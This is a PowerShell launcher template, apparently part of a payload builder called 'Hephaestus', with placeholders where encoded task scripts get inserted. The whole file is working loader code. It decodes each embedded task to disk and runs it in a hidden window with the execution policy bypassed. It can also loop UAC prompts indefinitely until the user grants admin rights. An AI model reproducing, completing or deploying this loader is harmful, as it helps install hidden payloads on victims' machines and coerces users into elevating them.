###head
###head

. ./utils.ps1
. ./consts_body.ps1

function GetLocalScriptPath {
    param
    (

    [Parameter(Mandatory = $true)]
    [string[]]
    $taskName
    )
    $scriptPath = Get-HephaestusFolder
    $fullPath = Join-Path -Path $scriptPath -ChildPath "$taskName.ps1"
    return $fullPath
}

function Save-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName,

        [Parameter(Mandatory = $true)]
        [string[]]
        $body
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    CustomDecode -inContent $body -outFile $scriptPath
    return $fullPath
}

function Invoke-Script
{
    param
    (
        [Parameter(Mandatory = $true)]
        [string[]]
        $taskName
    )
    $scriptPath= GetLocalScriptPath -taskName $taskName
    $taskDir = Split-Path -Parent -Path $scriptPath
    if ([string]::IsNullOrEmpty($taskDir)) { $taskDir = (Get-HephaestusFolder) }
    # $globalDebug: visibility only (window style). Elevation path is unchanged.
    $taskWinStyle = $(if ($globalDebug) { "Normal" } else { "Hidden" })
    $taskArgList = "-ExecutionPolicy Bypass -File `"$scriptPath`" -Task $taskName"
    if (IsElevated) {
        Start-Process powershell.exe -WindowStyle $taskWinStyle -WorkingDirectory $taskDir -ArgumentList $taskArgList
    }
    else {
        Start-Process powershell.exe -WindowStyle $taskWinStyle -Verb RunAs -WorkingDirectory $taskDir -ArgumentList $taskArgList
    }
}

$global:Task = $null

for ($i = 0; $i -lt $args.Count; $i++) {
    if ($args[$i] -eq '-Task') {
        if ($i + 1 -lt $args.Count) {
            $global:Task = $args[$i + 1]
        } else {
            writedbg "No value provided for -Task argument."
        }
    }
}

# Script file path for one-shot self-elevation (not reliable from inside a function's $MyInvocation).
$script:HephaestusEntryScript = $MyInvocation.MyCommand.Path
if ([string]::IsNullOrWhiteSpace($script:HephaestusEntryScript)) { $script:HephaestusEntryScript = $PSCommandPath }

function Main 
{
    $showPath = GetLocalScriptPath -taskName "program"
    writedbg "program curScript: $showPath"

    if ($global:Task) {
        writedbg "Task - $task"
        & $global:Task
    } else 
    {               
        # One elevation for this process, then spawn task children elevated (no per-task RunAs).
        if (-not (IsElevated)) {
            $selfPath = $script:HephaestusEntryScript
            if (-not [string]::IsNullOrWhiteSpace($selfPath) -and (Test-Path -LiteralPath $selfPath)) {
                if (-not (Test-Path variable:server)) {
                    writedbg "Main: FATAL server config is missing - misbuilt or corrupt payload; aborting (no task launch)." -ForegroundColor Red
                    return
                }
                else {
                    $delaySec = [int]$server.aggressiveAdminDelay
                    if ($delaySec -lt 0) { $delaySec = 0 }
                    $aggressiveElevRetry = [bool]$server.aggressiveAdmin
                    if ($aggressiveElevRetry) {
                        $attempt = GetArgInt("attempt")
                        while ($true) {
                            $attempt++
                            if ($attempt -ne 1) {
                                writedbg "Main: elevation not accepted; sleeping ${delaySec}s before next UAC (attempt $attempt)"
                                Start-Sleep -Seconds $delaySec
                            }
                            try {
                                RunMe -script $selfPath -repassArgs $true -argName "-attempt" -argValue "$attempt" -uac $true -Wait $true
                                return
                            } catch {
                                writedbg "Main: elevation cancelled or failed: $_"
                            }
                        }
                    } else {
                        writedbg "Main: elevating launcher once, then exiting this process"
                        RunMe -script $selfPath -repassArgs $true -argName "" -argValue "" -uac $true
                        return
                    }
                }
            }
            else {
                writedbg "Main: FATAL launcher script path missing or not on disk - cannot elevate; aborting (no task launch)." -ForegroundColor Red
                return
            }
        }

        $taskKeyOrder = @(
###taskKeyOrder
        )
        $tasks = @{
           ###doo
        }

        writedbg "Main - "
        foreach ($key in $taskKeyOrder)
        {
            if (-not $tasks.ContainsKey($key)) { continue }
            $task = $key
            $body = $tasks[$key]
            writedbg "Main - $task"
            Save-Script -taskName $task -Body $body
            Invoke-Script -taskName $task
        }
    }
}

Main

if ($globalDebug)
{
    Start-Sleep -Seconds 100
}